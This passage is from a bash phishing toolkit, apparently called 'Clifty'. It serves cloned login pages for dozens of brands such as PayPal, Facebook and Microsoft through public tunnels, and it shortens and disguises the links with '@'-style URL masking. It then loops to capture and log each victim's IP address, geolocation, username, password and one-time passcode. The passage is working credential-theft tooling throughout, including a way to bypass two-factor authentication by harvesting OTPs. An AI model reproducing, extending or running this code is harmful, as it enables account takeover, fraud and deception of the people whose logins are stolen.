        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
        echo -e ""
        echo -e ""
        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CHANGE REDIRECT URL ${NF} : ${NC}"
        echo -e "   ${GREEN}Current Redirect Url : ${BLUE}${rdurl}${NA}"   
        echo -e " "
        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
        echo -e ""
        selected="Clifty/${siname}/${sitype}/${tutype}"
        uprompt;read -p "${prompt}" rdchoice
		case $rdchoice in
                1 | Y | y | yes | Yes | YES)
  	                redirect_input;;
                *)
                        redirect_default;;
	        esac
}
redirect_input() {
        echo -e "\n"
        echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR REDIRECT URL ${NF} : ${NA}"
        temprompt=$(echo -e "${YELLOW}>> " )
        read -p "$temprompt" urdurl
        if [[ "${urdurl//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
		echo -e "${RED}[${WHITE}!${RED}]${RED} Don't type http or https in the URL"
                sleep 3
                { clear; banner; }
                echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
                echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
                echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
                echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
                echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
                echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
                echo -e ""
                redirect_input
        else
                redirect_setup
	fi
}
redirect_setup() {
        rm -rf rdurl.php
        rm -rf "${www_dir}/rdurl.php"
	if [ -f ${www_dir}/NOTP ];then
                awk "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/process.php" > rdurl.php
                rm -rf "${www_dir}/process.php"
                mv rdurl.php "${www_dir}/process.php"
                rdurl=${urdurl}
        elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
                awk  "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php" > rdurl.php
                rm -rf "${www_dir}/otp.php"
                mv rdurl.php "${www_dir}/otp.php"
                rdurl=${urdurl}
	else
		echo -e "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
                echo -ne "\n${RED}[${WHITE}?${RED}]${GREEN} Setting up default redirect URL"
                echo -ne "${RED}[${WHITE}?${RED}]${GREEN} Redirect URL : ${BLUE} ${rdurl}"
                sleep 3
                redirect_default
        fi
}
redirect_default() {
        rm -rf rdurl.php
        rm -rf "${www_dir}/rdurl.php"
	if [ -f ${www_dir}/NOTP ];then
                awk "{gsub(\"redirecturl\",\"https://${rdurl}\"); print}" "${www_dir}/process.php" > rdurl.php
                rm -rf "${www_dir}/process.php"
                mv rdurl.php "${www_dir}/process.php"
        elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
                awk  "{gsub(\"redirecturl\",\"https://${rdurl}\"); print}" "${www_dir}/otp.php" > rdurl.php
                rm -rf "${www_dir}/otp.php"
                mv rdurl.php "${www_dir}/otp.php"
	else
		echo -e " ${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up redirect URL!!"
                sleep 5
        fi

}

#Check whether link was generated properly
checklink() {
	if [ -z "$LINK" ]; then
		clear
		banner
		echo -e " "
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
		sleep 5
		tutype="LocalHost"
                tuid="localhost"
		start_localhost
	else
		cusurl
	fi
}

## URL MASKING
cusurl(){
	{ clear; banner; echo -e " "; }
        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}${rdurl}${NA}"
        echo -e ""
        echo -e ""
        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CUSTOMIZE THE URL BELOW ${NF} : ${NA}"
        echo -e "   ${GREEN}URL : ${BLUE}${LINK}${NA}"  
        echo -e "" 
        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
        echo -e ""
        temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
	read -p "${temprompt}" CUS_URI
	case $CUS_URI in
                Y | y)
			check_netstats
			if [ $netstats == "online" ]; then
				shorten_keystocks
			else
				{ clear; sbanner; }
				echo -e "${RED}Your offline, Cannot shorten link. Proceeding without shortening link"
				sleep 5
				displaylink
				capture_data_check
			fi;;
                N | n | *)
			displaylink
			capture_data_check;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
	                { clear; banner; cusurl; }
                esac
}
shorten_keystocks(){
        echo -e ""
        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}ENTER YOUR CUSTOM URL${NA}${YELLOW} >> ${NA}"
        temprompt="$(echo -e "${GREEN}(eg:https://google.com | www.google.com) ${YELLOW}>> ${BLUE}")"
	read -p "${temprompt}" CUS_URL
	checkurl ${CUS_URL}
	echo -e " "
        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Enter Some KeyStocks (eg: sign-in-2FA)${YELLOW} >> ${BLUE}")"
	read -p "${temprompt}" Keystks #KEY_STOCKS
	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
		shorten
	else
		echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
		{ sleep 1.5; clear; banner; cusurl; }
	fi
}
checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
		if [[  "${1::3}" != 'www' ]]; then
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http/https insted of : ${CUS_URL}"
			{ sleep 1.5; clear; banner; cusurl; }
		fi
	fi
}
check_site() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
shorten() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} SHORTENING URL : ${YELLOW} ${LINK}"
	echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Shortening maytake some time (approx 30 seconds)"
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="
	if [[ $(check_site $isgd) == 2* ]]; then
		shorten_isgd $isgd "$LINK"
	else
		final_isgd_url="${YELLOW} Couldn't shorten this link here"
                masked_isgd_url="${YELLOW} Couldn't mask this link here"
	fi
	if [[ $(check_site $shortcode) == 2* ]]; then
		shorten_shortcode $shortcode "$LINK"
	else
		final_shortcode_url1="${YELLOW} Couldn't shorten this link here"
                masked_shortcode_url1="${YELLOW} Couldn't mask this link here"
		final_shortcode_url2="${YELLOW} Couldn't shorten this link here"
                masked_shortcode_url2="${YELLOW} Couldn't mask this link here"
		final_shortcode_url3="${YELLOW} Couldn't shorten this link here"
                masked_shortcode_url3="${YELLOW} Couldn't mask this link here"
	fi
	if [[ $(check_site $tinyurl) == 2* ]]; then
		shorten_tinyurl $tinyurl "$LINK"
	else
		final_tinyurl_url="${YELLOW} Couldn't shorten this link here"
                masked_tinyurl_url="${YELLOW} Couldn't mask this link here"
	fi
	displayshortlink
}
shorten_isgd() {
	link_isgd=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	processed_isgd_url=${link_isgd#http*//}
	final_isgd_url="https://$processed_isgd_url"
	masked_isgd_url="${CUS_URL}-${Keystks}@$processed_isgd_url"
}
shorten_shortcode() {
	link_shortcode=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	processed_shortcode_url1=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	final_shortcode_url1="https://$processed_shortcode_url1"
	masked_shortcode_url1="${CUS_URL}-${Keystks}@$processed_shortcode_url1"
	processed_shortcode_url2=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	final_shortcode_url2="https://$processed_shortcode_url2"
	masked_shortcode_url2="${CUS_URL}-${Keystks}@$processed_shortcode_url2"
	processed_shortcode_url3=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link3":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	final_shortcode_url3="https://$processed_shortcode_url3"
	masked_shortcode_url3="${CUS_URL}-${Keystks}@$processed_shortcode_url3"
}
shorten_tinyurl() {
	link_tinyurl=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [ $link_tinyurl=="" ]; then
		processed_tinyurl_url="${YELLOW} Couldn't shorten this link here"
		final_tinyurl_url="${YELLOW} Couldn't shorten this link here"
		masked_tinyurl_url="${YELLOW} Couldn't mask this link here"
	else
		processed_tinyurl_url=${link_tinyurl#http*//}
		final_tinyurl_url="https://$processed_tinyurl_url"
		masked_tinyurl_url="${CUS_URL}-${Keystks}@$processed_tinyurl_url"
	fi
}

## Display link
displaylocalhost(){
        { clear; sbanner; echo -e ""; }
        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}${rdurl}${NA}"
        echo -e ""
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT}"
}
displaylink(){
	displaylocalhost
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} ORIGINAL URL  : ${GREEN}${LINK}"
}
displayshortlink() {
	displaylink
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 1 : ${GREEN}${final_isgd_url}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 2 : ${GREEN}${final_shortcode_url1}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  2 : ${GREEN}${masked_shortcode_url1}"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 3 : ${GREEN}${final_shortcode_url2}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  3 : ${GREEN}${masked_shortcode_url2}"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 4 : ${GREEN}${final_shortcode_url3}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 5 : ${GREEN}${final_tinyurl_url}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
	capture_data_check
}

#Capture data check
capture_data_check(){
	if [ -f ${www_dir}/NOTP ];then
                capture_data_notp
        elif [ -f ${www_dir}/OOTP ];then
                capture_data_ootp
        elif [ -f ${www_dir}/POTP ];then
                capture_data_potp
	else
		echo -e " Error Occured!!"
        fi
# NOTP - id pass
# OOTP - id otp
# POTP - id pass otp
}

## Print data no otp
capture_data_notp() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
	while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                fi
                sleep 0.75
                if [[ -e "${www_dir}/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !"
                        capture_id
			capture_pass
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
                fi
                sleep 0.75
	done
}

## Print data otp
capture_data_ootp() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
	while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                fi
                sleep 0.75
                if [[ -e "${www_dir}/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                        capture_id
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP > "
			echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
                fi
		if [[ -e "${www_dir}/otp.txt" ]]; then
			echo -ne "\n\n${GREEN} OTP Found !"
                        capture_otp
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
                fi
                sleep 0.75
	done
}

## Print data notp & otp
capture_data_potp() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
	while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                fi
                sleep 0.75
                if [[ -e "${www_dir}/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!!"
                        capture_id
			capture_pass
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP >"
                       echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
                fi
		if [[ -e "${www_dir}/otp.txt" ]]; then
			echo -ne "\n\n${GREEN} OTP Found !"
			capture_otp
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
		fi
                sleep 0.75
	done
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' ${www_dir}/ip.txt | cut -d " " -f2 | tr -d '\r')
##	IP=$(awk -F 'IP: ' '{print $2}' ${www_dir}/ip.txt | xargs)
	victim_ip=${IP}
	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE} VICTIM IP : ${victim_ip}${RESETBG}${NA}"
	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
		echo -ne "${RED} IP details cannot be captured in localhost server"
		echo -e " "
		save_ip
	else
		ip_details $IP
		save_ip
	fi
}
save_ip() {
	cat ${dumps_dir}/space.txt >> ${log_name}.txt
	cat ${dumps_dir}/line.txt >> ${log_name}.txt
	cat ${www_dir}/ip.txt >> ${log_name}.txt
	cat ${dumps_dir}/space.txt >> ${log_name}.txt
        cat ${dumps_dir}/line.txt >> ${log_name}.txt
	cat ${dumps_dir}/space.txt >> ${log_name}.txt
	mv ${log_name}.txt ${logs_dir}
	echo -ne " "
	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
	rm -rf ${www_dir}/ip.txt
}
ip_details() {
	echo -e " " 
	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Trying to capture details of IP : ${BLUE}${IP} "
##	curl -s -L "http://ipwhois.app/json/$IP" -o rawtrack.txt
	wget --no-check-certificate "http://ipwhois.app/json/${IP}" -O rawtrack.txt > /dev/null 2>&1
	sleep 2
	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
	iptt=$(sed -n 's/"ip"://p' track.txt)
	if [[ $iptt != "" ]]; then
		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
	fi
	ipstats=$(sed -n 's/"success"://p' track.txt)
	if [[ $ipsuccess != "" ]]; then
                echo -e  "\n${GREEN} IP details capturing: ${NC} $iptt"
        fi
	iptype=$(sed -n 's/"type"://p' track.txt)
	if [[ $iptype != "" ]]; then
		echo -e "${GREEN} IP type: ${NC} $iptype"
	fi
	latitude=$(sed -n 's/"latitude"://p' track.txt)
	if [[ $latitude != "" ]]; then
		echo -e  "${GREEN} Latitude:  ${NC} $latitude"
	fi
	longitude=$(sed -n 's/"longitude"://p' track.txt)
	if [[ $longitude != "" ]]; then
		echo -e  "${GREEN} Longitude:  ${NC} $longitude"
	fi
	city=$(sed -n 's/"city"://p' track.txt)
	if [[ $city != "" ]]; then
		echo -e "${GREEN} City: ${NC} $city"
	fi
	isp=$(sed -n 's/"isp"://p' track.txt)
	if [[ $isp != "" ]]; then
		echo -e "${GREEN} Isp: ${NC} $isp"
	fi
	country=$(sed -n 's/"country"://p' track.txt)
	if [[ $country != "" ]]; then
		echo -e  "${GREEN} Country: ${NC} $country"
	fi
	flag=$(sed -n 's/"country_flag"://p' track.txt)
	if [[ $flag != "" ]]; then
		echo -e "${GREEN} Country flag: ${NC} $flag"
	fi
	cap=$(sed -n 's/"country_capital"://p' track.txt)
	if [[ $cap != "" ]]; then
		echo -e "${GREEN} Country capital: ${NC} $cap"
	fi
	phon=$(sed -n 's/"country_phone"://p' track.txt)
	if [[ $phon != "" ]]; then
		echo -e "${GREEN} Country code: ${NC} $phon"
	fi
	continent=$(sed -n 's/"continent"://p' track.txt)
	if [[ $continent != "" ]]; then
		echo -e  "${GREEN} Continent:  ${NC} $continent"
	fi
	ccode=$(sed -n 's/"currency_code"://p' track.txt)
	if [[ $ccode != "" ]]; then
		echo -e "${GREEN} Currency code: ${NC} $ccode"
	fi
	region=$(sed -n 's/"region"://p' track.txt)
	if [[ $region != "" ]]; then
		echo -e "${GREEN} State: ${NC} $region"
	fi
	cat ${dumps_dir}/space.txt >> ${log_name}.txt
        cat ${dumps_dir}/line.txt >> ${log_name}.txt
	cat ${dumps_dir}/space.txt >> ${log_name}.txt
	cat track.txt >> "${log_name}.txt"
	rm -rf track.txt
	rm -rf rawtrack.txt
}

## Get credentials
capture_id() {
        victim_id=$( cat ${www_dir}/usernames.txt)
	echo -e "\n${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_id}${RESETBG}${NA}"
        echo -e "${GREEN} Saved in : ${LBLUE}/logs/${log_name}.txt"
	cat ${dumps_dir}/space.txt >> "${logs_dir}/${log_name}.txt"
        cat ${www_dir}/usernames.txt >> "${logs_dir}/${log_name}.txt"
	rm -rf ${www_dir}/usernames.txt
}

## Get credentials
capture_pass() {
	victim_pass=$( cat "${www_dir}/pass.txt")
	echo -e "\n${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_pass}${RESETBG}${NA}"
        echo -e "${GREEN} Saved in : ${LBLUE}/logs/${log_name}.txt"
	cat ${dumps_dir}/space.txt >> ${logs_dir}/${log_name}.txt
        cat ${www_dir}/pass.txt >> ${logs_dir}/${log_name}.txt
	rm -rf ${www_dir}/pass.txt
}

## Get otp
capture_otp() {
	victim_otp=$( cat "${www_dir}/otp.txt")
	echo -e "\n${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_otp}${RESETBG}${NA}"
        echo -e "${GREEN} Saved in : ${LBLUE}/logs/${log_name}.txt"
	cat ${dumps_dir}/space.txt >> ${logs_dir}/${log_name}.txt
        cat ${www_dir}/otp.txt >> ${logs_dir}/${log_name}.txt
	rm -rf ${www_dir}/otp.txt
}

#online or offline stats
check_netstats() {
userip
#	wget -q --spider http://api.github.com
#	if [ $? -eq 0 ]; then
#		netstats="${GREEN}Online"
#		plainnetstats="online"
#	else
#		netstats="${RED}Offline"
#		plainnetstats="offline"
#	fi
}
userip() {
        myip=$(curl -s ipinfo.io/ip)
	if [ -z $myip ]; then
		myip="${RED}Offline"
		netstats="${RED}Offline"
                plainnetstats="offline"
	else
		myip="${GREEN}$myip"
		netstats="${GREEN}Online"
                plainnetstats="online"
	fi
}
#Logs check
logs_check() {
	if [ -z "$(ls -A $DIR)" ]; then
		logs_menu
	else
		echo -e "No logs found"
		{ sleep 1; clear; mainmenu; }
	fi
}
logs_menu() {
{ clear; banner; }
userip; echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
check_netstats; echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e " "
echo -e " "
echo -e "${RED}[${WHITE}01${RED}]${YELLOW} View Logs    "
echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Open Logs   "
echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Reset Logs  "
echo -e "${RED}[${WHITE}04${RED}]${YELLOW} Back to Tunnel menu   "
temprompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty/Logs${NF} >>${NA} ${BLUE}")"
read -p "${temprompt}" reply_logs_menu

        case $reply_logs_menu in
                1 | 01)
                        ls ${logs_dir}/
			{ sleep 8; clear; logs_menu; };;
                2 | 02)
			ls ${logs_dir}/
                        echo -e ""
                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Enter the file name without extension (.txt) >> ${BLUE}")"
                        read -p "${temprompt}"
			if [ -f "${logs_dir}/$REPLY.txt" ]; then
				cat ${logs_dir}/$REPLY.txt
			else
				echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
	                        { sleep 1; clear; logs_menu; }
			fi;;
                3 | 03)
                        echo -e ""
                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Do you want to clear every victim logs (Y/n) >> ${BLUE}")"
                        read -p "${temprompt}"
			case $REPLY in
        	                Y | y)
                	                rm -rf ${logs_dir}
					echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
					{ sleep 1; clear; tunnelmenu; };;
                        	N | n | *)
                                	{ clear;  logs_menu; };;

	                esac;;
                4 | 04)
                        { sleep 1; clear; tunnelmenu; };;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; clear; logs_menu; };;
        esac
}
## Tunnel selection
tunnelmenu() {
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
echo -e ""
echo -e "${ULWHITE}${BOLDWHITE}CHOOSE A TUNNEL TYPE${NF} : ${NC}"
echo -e " "
echo -e "${RED}[${WHITE}01${RED}]${YELLOW} Localhost    ${RED}[${CYAN}For Devs${RED}]"
echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
echo -e "${RED}[${WHITE}04${RED}]${YELLOW} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
echo -e "${NC}"
selected="Clifty/${siname}/${sitype}"
uprompt;read -p "${prompt}" tuchoice
        case $tuchoice in
                1 | 01)
                        tutype="LocalHost"
                        tuid="localhost"
                        start_localhost;;
                2 | 02)
                        tutype="Ngrok"
                        tuid="ngrok"
                        check_net_tunnel ${tuid};;
                3 | 03)
                        tutype="Cloudflared"
                        tuid="cloudflared"
                        check_net_tunnel ${tuid};;
		4 | 04)
                        tutype="LocalXpose"
                        tuid="localxpose"
                        check_net_tunnel ${tuid};;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; clear; tunnelmenu; };;
        esac
}

#check internel for tunnel
check_net_tunnel(){
	check_netstats
	if [ $plainnetstats == "online" ]; then
		"check_${1}"
	else
		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} Your offline can't start tunneler, ${BOLDGREEN}STARTING LOCALHOST INSTEAD... ${NA}"
		sleep 5
		start_localhost
	fi
}

mainmenu() {
{ clear; banner; }
userip; echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
check_netstats; echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e " "
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A SITE${NF} : ${NC} "
echo -e ""
echo -e "${BLUE} [1]${GREEN} Adobe         ${NC}""${BLUE} [26]${GREEN} Mediafire    ${NC}""${BLUE} [51]${GREEN} Telenor       ${NC}"
echo -e "${BLUE} [2]${GREEN} Airtel Sim    ${NC}""${BLUE} [27]${GREEN} Messenger    ${NC}""${BLUE} [52]${GREEN} Tiktok        ${NC}"
echo -e "${BLUE} [3]${GREEN} AirtelXstream ${NC}""${BLUE} [28]${GREEN} Microsoft    ${NC}""${BLUE} [53]${GREEN} Twitch        ${NC}"
echo -e "${BLUE} [4]${GREEN} Ajio          ${NC}""${BLUE} [29]${GREEN} Mobikwik     ${NC}""${BLUE} [54]${GREEN} Twitter       ${NC}"
echo -e "${BLUE} [5]${GREEN} Amazon 	   ${NC}""${BLUE} [30]${GREEN} Myspace      ${NC}""${BLUE} [55]${GREEN} Ubereats      ${NC}"
echo -e "${BLUE} [6]${GREEN} Apple 	   ${NC}""${BLUE} [31]${GREEN} Netflix      ${NC}""${BLUE} [56]${GREEN} verizon       ${NC}"
echo -e "${BLUE} [7]${GREEN} Badoo 	   ${NC}""${BLUE} [32]${GREEN} Ola          ${NC}""${BLUE} [57]${GREEN} VI            ${NC}"
echo -e "${BLUE} [8]${GREEN} Clash of Clans${NC}""${BLUE} [33]${GREEN} Origin       ${NC}""${BLUE} [58]${GREEN} VK            ${NC}"
echo -e "${BLUE} [9]${GREEN} Date 	   ${NC}""${BLUE} [34]${GREEN} Paypal       ${NC}""${BLUE} [59]${GREEN} Whatsapp      ${NC}"
echo -e "${BLUE} [10]${GREEN} Devianart    ${NC}""${BLUE} [35]${GREEN} Paytm        ${NC}""${BLUE} [60]${GREEN} Wordpress     ${NC}"
echo -e "${BLUE} [11]${GREEN} DropBox 	   ${NC}""${BLUE} [36]${GREEN} Phonepe      ${NC}""${BLUE} [61]${GREEN} Xbox          ${NC}"
echo -e "${BLUE} [12]${GREEN} Ebay         ${NC}""${BLUE} [37]${GREEN} Pinterest    ${NC}""${BLUE} [62]${GREEN} Yahoo         ${NC}"
echo -e "${BLUE} [13]${GREEN} Facebook     ${NC}""${BLUE} [38]${GREEN} Playstation  ${NC}""${BLUE} [63]${GREEN} Yandex        ${NC}"
echo -e "${BLUE} [14]${GREEN} Flipcart     ${NC}""${BLUE} [39]${GREEN} ProtonMail   ${NC}""${BLUE} [64]${GREEN} Youtube Subs  ${NC}"
echo -e "${BLUE} [15]${GREEN} Freefire     ${NC}""${BLUE} [40]${GREEN} Pubg         ${NC}""${BLUE} [65]${GREEN} Discord       ${NC}"
echo -e "${BLUE} [16]${GREEN} Github 	   ${NC}""${BLUE} [41]${GREEN} Quora        ${NC}""${BLUE} [66]${GREEN} Google WIFI   ${NC}"
